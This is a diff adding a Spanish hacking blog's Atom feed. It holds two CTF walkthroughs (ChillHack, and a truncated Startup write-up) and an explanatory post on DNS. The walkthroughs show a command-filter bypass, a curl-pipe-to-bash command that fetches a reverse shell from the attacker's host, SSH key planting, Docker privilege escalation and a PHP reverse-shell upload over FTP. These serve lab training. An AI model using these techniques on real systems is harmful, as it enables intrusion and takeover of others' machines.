@@ -1,0 +1,1825 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="enes"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="enes" /><updated>2024-08-27T17:56:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">CyberWiki</title><subtitle>Bienvenido a mi web sobre hacking</subtitle><entry><title type="html">ChillHack</title><link href="http://localhost:4000/blog/ChillHack" rel="alternate" type="text/html" title="ChillHack" /><published>2024-08-21T00:00:00+02:00</published><updated>2024-08-21T00:00:00+02:00</updated><id>http://localhost:4000/blog/ChillHack</id><content type="html" xml:base="http://localhost:4000/blog/ChillHack"><![CDATA[<p>Primero de todo, vamos a realizar un escaneo de los puertos de la dirección ip de la máquina víctima:</p>
+<div style="text-align: left;">
+  <table>
+    <tr>
+      <td style="vertical-align: top;">
+        <div style="text-align: center;">
+          <img src="../assets/images/Rooms/ChillHack/image.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:650px;" />
+        </div>
+      </td>
+      <td style="vertical-align: top;">
+        <div style="text-align: center;">
+          <img src="../assets/images/Rooms/ChillHack/image 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:910px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 2.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+<p>Vemos que tiene abierto los puertos <strong>21</strong> (conexión servicio FTP), <strong>22</strong> (conexión servicio SSH) y <strong>80</strong> (página web no encriptada “http”).</p>
+
+<p>Primero, vamos a iniciar una conexión anónima en el servidor <em>FTP</em>, debido a que permite dicho tipos de conexiones:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Vemos que al iniciar sesión, y realizar un listado de los archivos encontramos un fichero <strong>note.txt</strong> que podemos descargar en nuestra máquina mediante el comando <code class="language-plaintext highlighter-rouge">get</code>.</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 4.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+<p>Vemos que el fichero contiene dos usuarios <strong>Anurodh</strong> y <strong>Apaar</strong>.</p>
+
+<p>Como aquí no podemos seguir haciendo nada, vamos a ver que encontramos la página web:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Como de costumbre, no encontramos nada a simple vista, por lo que vamos a realizar <em>fuzzing web</em> con <code class="language-plaintext highlighter-rouge">gobuster</code>:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Encontramos un directorio oculto, llamado <code class="language-plaintext highlighter-rouge">/secret</code> que si accedemos a él encontramos un campo donde podemos ejecutar código, por lo que estamos ante un <em>RCE</em>:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 7.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Si ejecutamos un comando más interesante como puede ser <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> obtenemos como resultado:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Podemos interceptar la petición del CRE mediante <em>burpsuite</em>, donde podemos enviar los comandos pero intentando bypassear la “protección”, por ejemplo:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Hemos hecho un bypass del comando <code class="language-plaintext highlighter-rouge">ls -la</code> escapando la s, por lo que podemos llevarlo a la práctica con otros comandos:</p>
+
+<table>
+  <tr>
+    <td style="vertical-align:top">
+      <div style="text-align: center;">
+      <img src="../assets/images/Rooms/ChillHack/image 10_1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+    <td style="vertical-align:top;">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 10_2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<p>Vemos que si escapamos el comando <code class="language-plaintext highlighter-rouge">cat /index.php</code> encontramos los comandos que no se pueden ejecutar de manera normal.
+Por lo que, podemos intentar ejecutar una <em>reverse shell</em> desde la página web:</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 12.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Ahora, en la web vamos a ejecutar el comando:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
+  </div>
+</div>
+
+<p>para poder obtener la <em>reverse shell</em> y seguido ejecutarla escapando el comando <code class="language-plaintext highlighter-rouge">bash</code>.</p>
+
+<table style="text-align:center">
+  <tr>
+    <td style="vertical-align:top;">
+      <div>
+        <img src="../assets/images/Rooms/ChillHack/image 13.png" alt="Untitled" onclick="openModal(this.src)" />
+      </div>
+      Como resultado, tenemos que al escuchar y ejecutar la shell, estamos dentro del servidor.
+    </td>
+    <td style="vertical-align:top;">
+      <div>
+        <img src="../assets/images/Rooms/ChillHack/image 14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:300px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<p>Ahora dentro, podemos intentar escalar privilegios. Por lo que podemos hacer uso del comando -&gt; <code class="language-plaintext highlighter-rouge">sudo -l</code> para obtener los comandos que puede ejecutar como root el usuario <em>www-data</em>.</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 15.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>En efecto, vemos que el comando <code class="language-plaintext highlighter-rouge">/home/apaaar/.helpline.sh</code> pueden ejecutarlos todos los usuarios del sistema.
+Como es un script escrito en <strong>bash</strong> podemos ver su contenido:</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 16.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px" />
+</div>
+
+<p>Si ejecutamos el comando especificando el usuario <code class="language-plaintext highlighter-rouge">-u apaar</code> y en el mensaje escribimos <code class="language-plaintext highlighter-rouge">/bin/bash</code> (ejecución de una terminal), esta se ejecutará como <strong>apaar</strong> (ya que hemos especificado su usuario).</p>
+
+<table style="text-align:left">
+  <tr>
+    <td style="vertical-align:top; width:50%">
+      Y vemos que lo que realiza es una interacción, donde nos pide un nombre y un mensaje.
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 17.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+    <td style="vertical-align:top; width:50% ">
+      Tratamiento de la tty (para poder tener una CLI más amigable):
+    <div style="text-align:left;">
+      <div class="code-container">
+          <div class="code-header">
+            Bash
+            <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+          </div>
+          <pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash)'
+(ctrl + Z)
+stty raw -echo;fg
+stty rows 29 columns 126
+export TERM=screen</code></pre>
+        </div>
+      </div>
+  </td>
+  </tr>
+</table>
+
+<p>Procedemos a buscar la flag y la tenemos.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 18.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Ahora, para seguir continuando con el CTF, vamos a realizar una escalada de privilegios pero ahora a root, para poder conseguir así la última flag.
+Podemos realizar una búsqueda de binarios (spoiler, no va a servir de nada).</p>
+
+<p>Ya que estamos dentro del servidor podemos echarle un ojo a los puertos que tiene abierto y vemos que tiene en escucha uno muy raro -&gt; <code class="language-plaintext highlighter-rouge">127.0.0.1:9001</code>.</p>
+
+<table style="text-align:left">
+  <tr>
+    <td style="vertical-align:top; width:50%">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 19.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+Encontramos un panel de login, que puede cuadrar con el servicio *SSH* que hay corriendo por el puerto 22, por lo que podemos buscar el <strong>id_rsa</strong> del usuario <strong>apaar</strong> para poder iniciar sesión.
+    </td>
+    <td style="vertical-align:top; width:50% ">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 23.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<p>Pero primero, vamos a volver a hacer <em>fuzzing web</em> a esta web:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">gobuster dir -u ip_maquina:9001 -w /ruta_wordlist</code></pre>
+  </div>
+</div>
+<p>y vemos que tenemos un directorio llamado <code class="language-plaintext highlighter-rouge">/images</code>, si accedemos a él encontramos dos archivos, el que nos interesa es el ‘.jpg’.</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 28.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Ahora nos descargamos el archivo:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">wget hacker-with-laptop_23-2147985341.jpg</code></pre>
+  </div>
+</div>
+<p>Como tenemos una imagen con extensión ‘.jpg’ podemos hacer uso de <code class="language-plaintext highlighter-rouge">steghide</code> para poder encontrar información oculta en la imagen:</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 29.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Y esto no da un archivo llamado ‘backup.zip’, el cual si queremos descomprimir nos pedirá una contraseña, la cual podemos intentar romper con un ataque de fuerza bruta, con <code class="language-plaintext highlighter-rouge">fcrackzip</code>:</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 30.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Tenemos la contraseña del ‘.zip’, vamos a abrirlo:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">unzip backup.zip
+nano source_code.php</code></pre>
+  </div>
+</div>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 31.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Encontramos la contraseña del otro usuario <strong>Anurodh</strong>, la cual está encriptada en base64, la desencriptamos y nos la guardamos:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">echo -e "contraseña_base64" | base64 -d</code></pre>
+  </div>
+</div>
+
+<p>Ahora sí, vamos a proceder a obtener las claves <em>id_rsa</em> del usuario <strong>apaar</strong>, para ello vamos al directorio donde estas se almacenan:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">cd /home/apaar/.shh</code></pre>
+  </div>
+</div>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 20.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Vemos que no tenemos el <strong>id_rsa</strong> como tal, si no que tenemos un fichero llamado ‘authorized_key’ que son las claves permitidas y autorizadas para poder realizar la conexión vía <em>SSH</em>.
+Pero nosotros podemos crear una clave e introducirla en dicho fichero ya que tenemos permisos de escritura en el mismo.</p>
+
+<p>Con <code class="language-plaintext highlighter-rouge">ssh-keygen</code> podemos crear una clave para el usuario <strong>apaar</strong> y tenemos tanto el <strong>id_rsa</strong> (apaar) como el <strong>id_rsa.pub</strong> (apaar.pub).</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 21.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px" />
+</div>
+
+<p>A continuación, guardamos <em>apaar.pub</em> en el fichero ‘authorized_keys’ y apaar en un archivo <em>id_rsa</em> en nuestra máquina y podremos realizar nuestro inicio de sesión vía <em>SSH</em>.</p>
+
+<table style="text-align:left">
+  <tr>
+    <td style="vertical-align:top; width:45%">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 22.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+    <td style="vertical-align:top; width:50% ">
+    Ahora que estamos dentro y previamente obtuvimos la contraseña del usuario <strong>Anurodh</strong>, mediante el comando <code>su Anurodh</code> y su contraseña nos convertiremos en dicho usuario:
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 33.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+      </div>
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 34.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+      </div>
+      Con el comando <code>id</code> vemos información acerca del usuario actual y vemos que pertenece al grupo <strong>docker</strong>, es decir, tiene permisos para poder ejecutar comandos Docker y puede acceder al <em>daemon</em> Docker.
+    </td>
+  </tr>
+</table>
+
+<p>Podemos buscar en <a href="https://gtfobins.github.io/gtfobins/docker/#shell">GTFObins/Docker</a> un exploit para escalar privilegios y en efecto, hemos escalado privilegios, ergo somos usuarios root.</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 35.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Hemos obtenido la root flag, por lo que hemos terminado el CTF.</p>
+
+<hr />]]></content><author><name></name></author><category term="Enumeración" /><category term="Web" /><category term="Reverse shell" /><category term="Privilege Escalation" /><summary type="html"><![CDATA[Easy level CTF. Capture the flags and have fun!]]></summary></entry><entry><title type="html">Sistema de Nombres de Dominio “DNS”</title><link href="http://localhost:4000/blog/DNS" rel="alternate" type="text/html" title="Sistema de Nombres de Dominio “DNS”" /><published>2024-08-13T00:00:00+02:00</published><updated>2024-08-13T00:00:00+02:00</updated><id>http://localhost:4000/blog/DNS</id><content type="html" xml:base="http://localhost:4000/blog/DNS"><![CDATA[<h1 id="qué-es-dns">¿Qué es DNS?</h1>
+
+<p>El DNS ‘<em>Domain Name System</em>’ nos proporciona una forma de comunicarnos con dispositivos por internet sin tener que recordar todas las <a href="https://joseeelv.github.io//blog/Nw">direcciones IPs</a>.</p>
+
+<p>Para ello, el <em>DNS</em> nos ayuda de la forma que a cada dirección IP le da un dominio ó conjunto de dominios únicos para poder acceder a él, sin tener que recordar la dirección del mismo.</p>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/DNS/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px" />
+</div>
+
+<p>Vemos como el dominio ‘<a href="http://google.com">Google.com</a>‘ está asociado a una dirección IP ‘216.58.217.206’, donde el servidor DNS traduce dicho dominio a su ip correspondiente.</p>
+
+<h1 id="jerarquía-de-dominios">Jerarquía de dominios</h1>
+
+<p>Los dominios al igual que los sistema de ficheros de los sistemas operativos contienen una jerarquía.</p>
+<div style="text-align:left">
+  <table>
+    <tr>
+      <td style="vertical-align:top;">
+        <div style="text-align:center; ">
+          <img src="../assets/images/Labs/DNS/Untitled.jpeg" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px" />
+        </div>
+        <h2>Dominios de segundo nivel</h2>
+        Preceden al TDL, es el nombre que recibe la dirección IP al realizar la conversión por el servidor DNS.<br />
+        Está limitado a 63 caracteres (a-z) y 0-9, además puede hacer uso de guiones + el TDL.
+      </td>
+      <td style="vertical-align:top; width:50%;">
+        <h2>TDL (Top-Level Domain)</h2>
+        El TDL es la parte más a la derecha de un dominio y va precedido por un punto , en el caso de google.com, el TLD sería ‘<em>.com</em>’.<br /><br />
+        Encontramos dos tipos de TLDs, los gTDL ‘genéricos’ y los ccTDL ‘país’.
+        <ul>
+          <li><em><strong>gTDL</strong></em> → Está destinado a informar del propósito del dominio, por ejemplo, ‘<strong>&gt;.com</strong>&gt;’ está destinado a lo comercial,  ‘<strong>&gt;.org</strong>&gt;‘ destinado a una organización, etc.</li>
+          <li><em><strong>ccTDL</strong></em> → Se utiliza con fines geográficos, por tanto, si termina en ‘<strong>&gt;.es</strong>&gt;’ para sitios con sede en España.</li>
+        </ul>
+         <h2>Subdominio</h2>
+        Se encuentra a la izquierda del <em>dominio de segundo nivel</em>, se hace uso de un punto para separarlos.<br /><br />
+        Por ejemplo, el dominio <em>support.google.com</em>, la parte <em>support</em> es el subdominio.<br />
+        Mismo limite que los dominios de segundo nivel, pero no puede ni empezar ni terminar con guiones ni usar el guion bajo ( <em>_</em> ).
+      </td>
+    </tr>
+  </table>
+</div>
+
+<h1>Tipos de registros</h1>
+
+<blockquote>
+  <p>El DNS puede ser usado para sitios webs y para otros fines, por tanto, existen varios tipos de registros DNS.</p>
+</blockquote>
+
+<div style="text-align:left">
+  <table>
+    <tr>
+     <td style="vertical-align:top; width:25%">
+      <h2>Registro A</h2>
+      Estos registros son resueltos en <strong>direcciones IPv4</strong>.
+      <h2>Registro AAAA</h2>
+      Estos registros son resueltos en <strong>direcciones IPv6</strong>.
+      </td>
+      <td style="vertical-align:top;  width:25%">
+        <h2>Registro CNAME</h2>
+        Estos registros se resuelven en otro nombre de dominio y desde este se realiza otra solicitud DNS para resolver la dirección IP.
+      </td>
+      <td style="vertical-align:top;  width:25%">
+        <h2>Registro MX</h2>
+        Estos registros se resuelven en la dirección de los servidores de correo electrónico para el dominio que estamos consultado.<br />
+        Vienen con una ‘<em>flag</em>’ de prioridad.
+      </td>
+      <td style="vertical-align:top;  width:25%">
+        <h2>Registro TXT</h2>
+        En él se puede almacenar datos basados en texto y tienen múltiples usos, como enumerar servidores que pueden enviar correos electrónicos (controlando así los correos falsos y spam).
+      </td>
+    </tr>
+  </table>
+</div>
+
+<h1 id="solicitud-dns">Solicitud DNS</h1>
+
+<blockquote>
+  <p>Vamos a ver paso a paso que sucede a realizarse una solicitud DNS.</p>
+</blockquote>
+<ol>
+  <li>Cuando solicitamos el nombre de un dominio, nuestra computadora primero comprueba en su caché si se ha accedido a la dirección previamente. Si no es así, se realizará una petición un servidor DNS recursivo.</li>
+  <li>El servidor DNS recursivo es proporcionado por nuestro ISP. Este servidor contiene una caché que han sido buscados recientemente. Si el resultado se encuentra en ahí, se vuelve a mandar a nuestra máquina, si no se encuentra en la caché local, se busca la dirección en los servidores DNS root de internet.</li>
+  <li>Los servidores DNS roots actúan como la columna vertebral de los DNS en internet. Su trabajo consiste en redireccionarnos a los <strong>servidores de dominios Top-Level</strong></li>
+  <li>El servidor TDL contiene registros para buscar el servidor DNS autorizado para responder a la petición DNS.</li>
+  <li>El servidor DNS autorizado es el responsable de almacenar los registros DNS para un dominio en concreto y donde se realizará cualquier actualización a los registros DNS del nombre de dominio.</li>
+Dependiendo del tipo de registro, el registro DNS será enviado de nuevo al servidor DNS recursivo, realizando una copia en la caché local para futuras peticiones.
+</ol>
+
+<hr />]]></content><author><name></name></author><category term="LAB" /><summary type="html"><![CDATA[En este módulo vamos a conocer como funciona el DNS y como nos ayuda a la hora de acceder a cualquier dirección IP mediante dominios.]]></summary></entry><entry><title type="html">Start-up</title><link href="http://localhost:4000/blog/Startup" rel="alternate" type="text/html" title="Start-up" /><published>2024-08-12T00:00:00+02:00</published><updated>2024-08-12T00:00:00+02:00</updated><id>http://localhost:4000/blog/Startup</id><content type="html" xml:base="http://localhost:4000/blog/Startup"><![CDATA[<h1 id="usertxt">User.txt</h1>
+
+<p>Vamos a realizar un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap -p- -v &lt;ip_maquina&gt;</code>  y vemos que solo tenemos abierto el puerto 21, 22, 80.</p>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+</div>
+
+<blockquote>
+  <p>Tenemos los servicios ftp , ssh y una pagina web habilitadas.</p>
+</blockquote>
+
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%;">
+        Vamos a realizar una conexión ftp mediante el user Anonymous, ya que este permite conexiones anónimas:
+        <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+      <td style="vertical-align:top;  width:50%">
+        Estamos dentro y vamos a realizar un listado de archivos para ver que contiene el directorio en el que estamos:
+        <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+        </div>
+        Encontramos un directorio y dos archivos (Nada relevante), los cuales podemos descargar mediante el comando <code>get nombre_archivo</code> y abrilos en nuestra máquina.
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Como no hemos encontrado nada en el servidor vamos a acceder a la pagina web → <code class="language-plaintext highlighter-rouge">http://&lt;ip_maquina&gt;</code></p>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+</div>
+
+<p>Resultado al acceder a la pagina web de la maquina, nada interesante a simple vista, pero mediante <strong>fuzzing</strong> podemos enumerar los directorios de la misma, yo haré uso de <strong>gobuster</strong> → <code class="language-plaintext highlighter-rouge">gobuster dir --url ip_maquina_victima -w ruta_wordlist</code>:</p>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled 17.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Como bien sabemos tenemos activo un servicio <em>FTP</em> (al que accedimos antes), pero esta vez vamos a usarlo para subir archivos, estos archivos se encuentran en el directorio <code class="language-plaintext highlighter-rouge">/files</code>. Este archivo que vamos a subir será una reverse shell, la cual al ejecutarla desde el servidor, este se conectará a nuestra máquina y tendremos acceso a ella:
+En GitHub podemos buscar algún script el cual realice una reverse shell → <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey/php-reverse-shell</a></p>
+
+<div style="text-align:left">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%">
+      Dentro del script debemos de modificar los campos <strong>$ip</strong> y <strong>$port</strong> introduciendo la ip de nuestra máquina y el puerto habilitado para la escucha con netcat, respectivamente.
+      <div style="text-align:center; ">
+        <img src="../assets/images/Rooms/Startup/a.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+      </div>
+      </td>
+      <td style="vertical-align:top; width:50%">
+        Mediante <strong>netcat</strong> habilitamos el puerto de escucha para la reverse shell, este caso el puerto 444:
+        <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 4.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Si nos volvemos a conectar al servidor <em>FTP</em> y realizamos un <code class="language-plaintext highlighter-rouge">put script_reverse_shell.php</code> veremos que se realiza la conexión y estamos dentro del servidor (como se puede ver en la figura anterior).</p>
+
+<p>Vemos que somos el usuario <strong>www-data</strong> al hacer uso del comando <code class="language-plaintext highlighter-rouge">ls -la</code>, y vamos a proceder a la búsqueda de las flags. Para ello, lo más intuitivo es realizar una búsqueda de los ficheros que hay en el servidor → <code class="language-plaintext highlighter-rouge">find -type f -name nombre_fichero.txt 2&gt;/dev/null</code>, donde <code class="language-plaintext highlighter-rouge">-type</code> es el tipo del archivo (fichero), <code class="language-plaintext highlighter-rouge">-name</code> nombre del fichero a buscar y <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> devuelve los errores al null. Como resultado no encontramos nada, por lo que hay que seguir buscando.</p>
+
+<div style="text-align:left">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%">
+        Si realizamos un listado de archivos y directorios podemos ver que hay un directorio llamado <code>/incidents</code> al cual podemos acceder. Si accedemos a él y volvemos a listar, encontramos un par de archivos:
+        <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 5.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+      <td style="vertical-align:top; width:50%">
+       En este directorio vemos que hay un archivo con extensión '<em>.pcap</em>' (una captura de tráfico de red), y lo vamos a copiar en el directorio <code>/var/www/html/files/ftp</code> para poder descargarlo en nuestra máquina para analizarlo posteriormente:
+         <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 6.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div> 
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Por ejemplo, desde la página web podemos ver si se ha copiado o no el archivo:</p>
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled 7.png" alt="Untitled" />
+</div>
+
+<p>Ahora podemos descargarlo ya sea pinchando en él o haciendo un wget → <code class="language-plaintext highlighter-rouge">wget ip_maquina:/files/ftp/suspicious.pcapng</code>.
+Esta captura del tráfico de red la podemos analizar mediante la herramienta <strong>Wireshark</strong>:</p>
+<div style="text-align:left">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%">
+        <div style="text-align:center; ">
+        1. Abirmos la captura del tráfico de red:
+          <img src="../assets/images/Rooms/Startup/Untitled 8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+        </div>
+      </td>
+      <td style="vertical-align:top; width:50%">
+         <div style="text-align:center; ">
+        2. Seguimos el flujo de tráfico:
+          <img src="../assets/images/Rooms/Startup/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:540px;" />
+        </div> 
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Vamos a seguir el flujo de tráfico TCP para poder encontrar información:</p>
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/a1.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Hemos encontrado información acerca de un directorio llamado <code class="language-plaintext highlighter-rouge">/home/lennie</code>, por tanto, este directorio pertenece a un usuario, además tenemos su contraseña por lo que no tendríamos que realizar ningún ataque de fuerza bruta para obtenerla.</p>
+
+<div style="text-align:left">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%">
+      Si volvemos al escaneo de puertos realizado en primera instancia vemos que hay un servicion <em>SSH</em> corriendo por el puerto 22, asi que vamos a iniciar sesión mediante esas credenciales para acceder al servidor:
+        <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 15.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:400px;" />
+        </div>
+      </td>
+      <td style="width:50%">
+      Estamos dentro, vamos a tirar un <code>ls</code> para poder ver los archivos y directorios que hay en este.<br /><br />
+      Hemos encontrado un fichero llamado <em>user.txt</em>, por lo que si le hacemos un <code>cat user.txt</code>, tendremos la flag:
+      <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/a3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<h1 id="roottxt">Root.txt</h1>
+
+<p>Para poder obtener la flag ‘Root.txt’ tenemos que buscar una manera de poder escalar privilegios, ya que solo podremos acceder a ella mediante dichos privilegios.
+Podemos escalar privilegios de muchas maneras, por lo que primero de todo vamos a comprobar que comandos puede ejecutar como root el usuario <em>lennie</em>:</p>
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Como vemos, no podemos ejecutar ningún comando como root, por lo que vamos a buscar otra manera:</p>
+
+<p>En la búsqueda de la <em>user.txt</em> vimos que había un directorio llamado <code class="language-plaintext highlighter-rouge">/scripts</code>, vamos acceder a él para ver que encontramos:</p>
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled 11.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>En el directorio hemos encontrado un archivo <em>planner.sh</em>, que es un script bash que contiene <code class="language-plaintext highlighter-rouge">cat planner.sh</code>:</p>
+<div style="text-align:center; ">
+  <img src="../assets/images/Rooms/Startup/Untitled 12.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
